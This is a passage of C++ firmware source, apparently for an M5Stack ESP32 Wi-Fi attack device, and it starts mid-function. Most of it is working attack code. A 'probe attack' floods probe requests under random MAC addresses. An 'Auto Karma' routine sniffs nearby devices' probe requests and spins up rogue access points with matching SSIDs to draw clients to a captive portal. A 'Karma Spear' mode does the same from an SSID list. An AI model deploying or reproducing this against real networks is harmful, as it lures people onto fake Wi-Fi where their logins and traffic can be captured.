        } else if (M5.BtnC.wasPressed()) {
            currentListIndex++;
            if (currentListIndex >= numProbes) {
                currentListIndex = 0;
            }
            needDisplayUpdate = true;
        } else if (M5.BtnB.wasPressed()) {
            selectedIndex = currentListIndex;
        }
        listStartIndex = max(0, min(currentListIndex - maxDisplay + 1, numProbes - maxDisplay));
    }

    return selectedIndex;
}

bool removeProbeFromFile(const char* filepath, const String& probeToRemove) {
    File originalFile = openFile(filepath, FILE_READ);
    if (!originalFile) {
        return false;
    }

    const char* tempFilePath = "/temp.txt";
    File tempFile = openFile(tempFilePath, FILE_WRITE);
    if (!tempFile) {
        originalFile.close();
        return false;
    }

    bool probeRemoved = false;
    while (originalFile.available()) {
        String line = originalFile.readStringUntil('\n');
        if (line.endsWith("\r")) {
            line = line.substring(0, line.length() - 1);
        }

        if (!probeRemoved && line == probeToRemove) {
            probeRemoved = true;
        } else {
            tempFile.println(line);
        }
    }

    originalFile.close();
    tempFile.close();

    SD.remove(filepath);
    SD.rename(tempFilePath, filepath);

    return probeRemoved;
}

void deleteAllProbes(CallbackMenuItem& menuItem){
    if (ui.confirmPopup("Delete All Probes ?", true)) {
        File file = openFile("/probes.txt", FILE_WRITE);
        if (file) {
            file.close();
            ui.waitAndReturnToMenu("Deleted successfully");
            sendMessage("-------------------");
            sendMessage("Probes deleted successfully");
            sendMessage("-------------------");
        } else {
            ui.waitAndReturnToMenu("Error..");
            sendMessage("-------------------");
            sendMessage("Error opening file for deletion");
            sendMessage("-------------------");
        }
    } else {
        ui.waitAndReturnToMenu("Deletion cancelled");
    }
}

//KARMA-PART-FUNCTIONS-END


//probe attack

int checkNb = 0;
bool useCustomProbes;
std::vector<String> customProbes;

void probeAttack() {
    WiFi.mode(WIFI_MODE_STA);
    isProbeAttackRunning = true;
    useCustomProbes = false;

    if (!isItSerialCommand){
        useCustomProbes = ui.confirmPopup("Use custom probes?", true);
        M5.Display.clear();
        if (useCustomProbes) {
            customProbes = config.readCustomProbes();
        } else {
            customProbes.clear();
        }
    } else {
        M5.Display.clear();
        isItSerialCommand = false;
        customProbes.clear();
    }
    int probeCount = 0;
    int delayTime = 500; // initial probes delay
    unsigned long previousMillis = 0;
    const int debounceDelay = 200;
    unsigned long lastDebounceTime = 0;

    M5.Display.fillRect(0, M5.Display.height() - 60, M5.Display.width(), 60, TFT_RED);
    M5.Display.setCursor(135, M5.Display.height() - 40);
    M5.Display.setTextColor(TFT_WHITE);
    M5.Display.println("Stop");

    int probesTextX = 10;
    std::vector<String> messages;
    messages.push_back("Probe Attack running...");
    messages.push_back("Probes sent: ");
    String probesText = "Probes sent: ";
    ui.writeVectorMessage(messages, 10, 50, 20);

    sendMessage("-------------------");
    sendMessage("Starting Probe Attack");
    sendMessage("-------------------");

    while (isProbeAttackRunning) {
        unsigned long currentMillis = millis();
        handleDnsRequestSerial();
        if (currentMillis - previousMillis >= delayTime) {
            previousMillis = currentMillis;
            wireless.setRandomMAC_STA();
            wireless.setNextWiFiChannel();
            String ssid;
            if (!customProbes.empty()) {
                ssid = customProbes[probeCount % customProbes.size()];
            } else {
                ssid = wireless.generateRandomSSID(32);
            }
#if LED_ENABLED
            led.pattern5();
#endif
            WiFi.begin(ssid.c_str(), "");

            M5.Display.setCursor(probesTextX + probesText.length() * 12, 70);
            M5.Display.fillRect(probesTextX + probesText.length() * 12, 70, 50, 20, TFT_BLACK);
            M5.Display.print(++probeCount);

            M5.Display.fillRect(100, M5.Display.height() / 2, 140, 20, TFT_BLACK);

            M5.Display.setCursor(100, M5.Display.height() / 2);
            M5.Display.print("Delay: " + String(delayTime) + "ms");

            sendMessage("Probe sent: " + ssid);
        }

        M5.update();
        if (M5.BtnA.wasPressed() && currentMillis - lastDebounceTime > debounceDelay) {
            lastDebounceTime = currentMillis;
            delayTime = max(200, delayTime - 100); // min delay
        }
        if (M5.BtnC.wasPressed() && currentMillis - lastDebounceTime > debounceDelay) {
            lastDebounceTime = currentMillis;
            delayTime = min(1000, delayTime + 100); // max delay
        }
        if (M5.BtnB.wasPressed() && currentMillis - lastDebounceTime > debounceDelay) {
            isProbeAttackRunning = false;
        }
    }
    
    sendMessage("-------------------");
    sendMessage("Stopping Probe Attack");
    sendMessage("-------------------");
    wireless.restoreOriginalWiFiSettings();
    useCustomProbes = false;
    //ui.setInMenu(true);
}
// probe attack end


// Auto karma
bool isAPDeploying = false;

void startAutoKarma() {
    bluetoothEnabled = false;
    esp_wifi_set_promiscuous(false);
    esp_wifi_stop();
    esp_wifi_set_promiscuous_rx_cb(NULL);
    esp_wifi_deinit();
    delay(300); // Petite pause pour s'assurer que tout est terminé
    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    esp_wifi_init(&cfg);
    esp_wifi_start();
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(&autoKarmaPacketSniffer);

    isAutoKarmaActive = true;
    sendMessage("-------------------");
    sendMessage("Karma Auto Attack Started....");
    sendMessage("-------------------");

    config.readConfigFile();
    //createCaptivePortal();
    WiFi.softAPdisconnect(true);
    loopAutoKarma();
    esp_wifi_set_promiscuous(false);
}


void autoKarmaPacketSniffer(void* buf, wifi_promiscuous_pkt_type_t type) {
    if (type != WIFI_PKT_MGMT || isAPDeploying) return;

    const wifi_promiscuous_pkt_t *packet = (wifi_promiscuous_pkt_t*)buf;
    const uint8_t *frame = packet->payload;
    const uint8_t frame_type = frame[0];

    if (frame_type == 0x40) {
        uint8_t ssid_length_Karma_Auto = frame[25];
        if (ssid_length_Karma_Auto >= 1 && ssid_length_Karma_Auto <= 32) {
            char tempSSID[33];
            memset(tempSSID, 0, sizeof(tempSSID));
            for (int i = 0; i < ssid_length_Karma_Auto; i++) {
                tempSSID[i] = (char)frame[26 + i];
            }
            tempSSID[ssid_length_Karma_Auto] = '\0';
            memset(lastSSID, 0, sizeof(lastSSID));
            strncpy(lastSSID, tempSSID, sizeof(lastSSID) - 1);
            newSSIDAvailable = true;
        }
    }
}

uint8_t originalMACKarma[6];

void saveOriginalMACKarma() {
    esp_wifi_get_mac(WIFI_IF_AP, originalMACKarma);
}

void restoreOriginalMACKarma() {
    esp_wifi_set_mac(WIFI_IF_AP, originalMACKarma);
}


void loopAutoKarma() {
    while (isAutoKarmaActive) {
        M5.update();

        if (M5.BtnB.wasPressed()) {
            isAutoKarmaActive = false;
            isAPDeploying = false;
            isAutoKarmaActive = false;
            isInitialDisplayDone = false;
            //ui.setInMenu(true);
            memset(lastSSID, 0, sizeof(lastSSID));
            memset(lastDeployedSSID, 0, sizeof(lastDeployedSSID));
            newSSIDAvailable = false;
            esp_wifi_set_promiscuous(false);
            sendMessage("-------------------");
            sendMessage("Karma Auto Attack Stopped....");
            sendMessage("-------------------");
            break;
        }
        if (newSSIDAvailable) {
            newSSIDAvailable = false;
            activateAPForAutoKarma(lastSSID); // Activate the AP
            isWaitingForProbeDisplayed = false;
        } else {
            if (!isWaitingForProbeDisplayed || (millis() - lastProbeDisplayUpdate > 1000)) {
                displayWaitingForProbe();
                sendMessage("-------------------");
                sendMessage("Waiting for probe....");
                sendMessage("-------------------");
                isWaitingForProbeDisplayed = true;
            }
        }

        delay(100);
    }

    memset(lastSSID, 0, sizeof(lastSSID));
    newSSIDAvailable = false;
    isWaitingForProbeDisplayed = false;
    isInitialDisplayDone = false;
    //ui.setInMenu(true);
}

void activateAPForAutoKarma(const char* ssid) {
    karmaSuccess = false;
    if (config.isSSIDWhitelisted(ssid)) {
        sendMessage("-------------------");
        sendMessage("SSID in the whitelist, skipping : " + String(ssid));
        sendMessage("-------------------");
#if LED_ENABLED
        led.pattern6();
#endif
        return;
    }
    if (strcmp(ssid, lastDeployedSSID) == 0) {
        sendMessage("-------------------");
        sendMessage("Skipping already deployed probe : " + String(lastDeployedSSID));
        sendMessage("-------------------");
#if LED_ENABLED
        led.pattern7();
#endif
        return;
    }
#if LED_ENABLED
    led.pattern8();
#endif
    isAPDeploying = true;
    isInitialDisplayDone = false;
    wireless.setRandomMAC_APKarma(); // Set random MAC for AP

    if (captivePortalPassword == "") {
        WiFi.softAP(ssid);
    } else {
        WiFi.softAP(ssid ,captivePortalPassword.c_str());
    }
    // Display MAC, SSID, and channel
    String macAddress = wireless.getMACAddress();
    sendMessage("-------------------");
    sendMessage("Starting Karma AP for : " + String(ssid));
    sendMessage("MAC Address: " + macAddress);
    sendMessage("Time :" + String(autoKarmaAPDuration / 1000) + " s" );
    sendMessage("-------------------");
    unsigned long startTime = millis();

    while (millis() - startTime < autoKarmaAPDuration) {
        displayAPStatus(ssid, startTime, autoKarmaAPDuration);
        handleDnsRequestSerial();

        M5.update();

        if (M5.BtnB.wasPressed()) {
            memset(lastDeployedSSID, 0, sizeof(lastDeployedSSID));
#if LED_ENABLED
            led.pattern9();
#endif
            break;
        }

        int clientCount = WiFi.softAPgetStationNum();
        if (clientCount > 0) {
            karmaSuccess = true;
            currentClonedSSID = ssid;
            isCaptivePortalOn = true;
            isAPDeploying = false;
            isAutoKarmaActive = false;
            isInitialDisplayDone = false;
            //ui.setInMenu(true);
            sendMessage("-------------------");
            sendMessage("Karma Successful for : " + currentClonedSSID);
            sendMessage("-------------------");
            memset(lastSSID, 0, sizeof(lastSSID));
            newSSIDAvailable = false;
            ui.waitAndReturnToMenu("Karma Successful !!! ");
            return;
        }
        delay(100);
    }
    strncpy(lastDeployedSSID, ssid, sizeof(lastDeployedSSID) - 1);

    WiFi.softAPdisconnect(true);
    WiFi.mode(WIFI_MODE_STA);
    bluetoothEnabled = false;
    esp_wifi_set_promiscuous(false);
    esp_wifi_stop();
    esp_wifi_set_promiscuous_rx_cb(NULL);
    esp_wifi_deinit();
    delay(300); // Petite pause pour s'assurer que tout est terminé
    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    esp_wifi_init(&cfg);
    esp_wifi_start();
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(&autoKarmaPacketSniffer);
    isAPDeploying = false;
    isWaitingForProbeDisplayed = false;

    newSSIDAvailable = false;
    isInitialDisplayDone = false;
    sendMessage("-------------------");
    sendMessage("Karma Fail for : " + String(ssid));
    sendMessage("-------------------");
#if LED_ENABLED
    led.pattern9();
#endif
}


void displayWaitingForProbe() {
    if (!isWaitingForProbeDisplayed) {
        M5.Display.clear();
        M5.Display.setTextColor(TFT_WHITE);
        M5.Display.fillRect(0, M5.Display.height() - 60, M5.Display.width(), 60, TFT_RED);
        M5.Display.setCursor(100, M5.Display.height() - 40);
        M5.Display.println("Stop Auto");
        M5.Display.setCursor(50, M5.Display.height() / 2 - 20);
        M5.Display.print("Waiting for probe");

        isWaitingForProbeDisplayed = true;
    }

    unsigned long currentTime = millis();
    if (currentTime - lastProbeDisplayUpdate > 1000) {
        lastProbeDisplayUpdate = currentTime;
        probeDisplayState = (probeDisplayState + 1) % 4;

        int x = 50 + 12 * strlen("Waiting for probe");
        int y = M5.Display.height() / 2 - 20;
        int width = 36;
        int height = 20;

        M5.Display.fillRect(x, y, width, height, TFT_BLACK);

        M5.Display.setCursor(x, y);
        for (int i = 0; i < probeDisplayState; i++) {
            M5.Display.print(".");
        }
    }
}

void displayAPStatus(const char* ssid, unsigned long startTime, int autoKarmaAPDuration) {
    unsigned long currentTime = millis();
    int remainingTime = autoKarmaAPDuration / 1000 - ((currentTime - startTime) / 1000);
    int clientCount = WiFi.softAPgetStationNum();

    if (!isInitialDisplayDone) {
        M5.Display.clear();
        M5.Display.setTextColor(TFT_WHITE);
        M5.Display.setCursor((M5.Display.width() - 12 * strlen(ssid)) / 2, 50);
        M5.Display.println(String(ssid));
        M5.Display.setCursor((M5.Display.width() - 15 * strlen("Left Time: ")) / 2, 90);
        M5.Display.print("Left Time: ");
        M5.Display.setCursor((M5.Display.width() - 12 * strlen("Connected Client: ")) / 2, 130);
        M5.Display.print("Connected Client: ");

        M5.Display.setCursor(140, 220);
        M5.Display.println("Stop");
        isInitialDisplayDone = true;
    }

    int timeValuePosX = (M5.Display.width() + 12 * strlen("Left Time: ")) / 2;
    int timeValuePosY = 90;
    M5.Display.fillRect(timeValuePosX, timeValuePosY, 12 * 5, 20, TFT_BLACK);
    M5.Display.setCursor(timeValuePosX, timeValuePosY);
    M5.Display.print(remainingTime);
    M5.Display.println(" s");

    int clientValuePosX = (M5.Display.width() + 12 * strlen("Connected Client: ")) / 2;
    int clientValuePosY = 130;
    M5.Display.fillRect(clientValuePosX, clientValuePosY, 12 * 5, 20, TFT_BLACK);
    M5.Display.setCursor(clientValuePosX, clientValuePosY);
    M5.Display.print(clientCount);
}

//Auto karma end


void returnToMenu() {
    // Mettez ici le code nécessaire pour nettoyer avant de retourner au menu
    sendMessage("Returning to menu...");
    // Supposer que waitAndReturnToMenu() est la fonction qui retourne au menu
    ui.waitAndReturnToMenu(" User requested return to menu.");
}

void karmaSpear() {
    isAutoKarmaActive = true;
    //createCaptivePortal();
    File karmaListFile = openFile("/KarmaList.txt", FILE_READ);
    if (!karmaListFile) {
        sendMessage("Error opening KarmaList.txt");
        returnToMenu(); // Retour au menu si le fichier ne peut pas être ouvert
        return;
    }
    if (karmaListFile.available() == 0) {
        karmaListFile.close();
        sendMessage("KarmaFile empty.");
        returnToMenu(); // Retour au menu si le fichier est vide
        return;
    }

    // Compter le nombre total de lignes
    int totalLines = 0;
    while (karmaListFile.available()) {
        karmaListFile.readStringUntil('\n');
        totalLines++;
        if (M5.BtnA.wasPressed()) { // Vérifie si btnA est pressé
            karmaListFile.close();
            returnToMenu();
            return;
        }
    }
    karmaListFile.seek(0); // Revenir au début du fichier après le comptage

    int currentLine = 0;
    while (karmaListFile.available()) {
        if (M5.BtnA.isPressed()) { // Vérifie régulièrement si btnA est pressé
            karmaListFile.close();
            isAutoKarmaActive = false;
            ui.waitAndReturnToMenu("Karma Spear Stopped.");
            return;
        }

        String ssid = karmaListFile.readStringUntil('\n');
        ssid.trim();

        if (ssid.length() > 0) {
            activateAPForAutoKarma(ssid.c_str());
            sendMessage("Created Karma AP for SSID: " + ssid);
            displayAPStatus(ssid.c_str(), millis(), autoKarmaAPDuration);

            // Mise à jour de l'affichage
            int remainingLines = totalLines - (++currentLine);
            String displayText = String(remainingLines) + "/" + String(totalLines);
            M5.Display.setCursor((M5.Display.width() / 2) - 25, 10);
            M5.Display.print(displayText);

            if (karmaSuccess) {
                M5.Display.clear();
                break;
            }
            delay(200); // Peut-être insérer une vérification de btnA ici aussi
        }
    }
    karmaListFile.close();
    isAutoKarmaActive = false;
    sendMessage("Karma Spear Failed...");
    ui.waitAndReturnToMenu("Karma Spear Failed...");
}
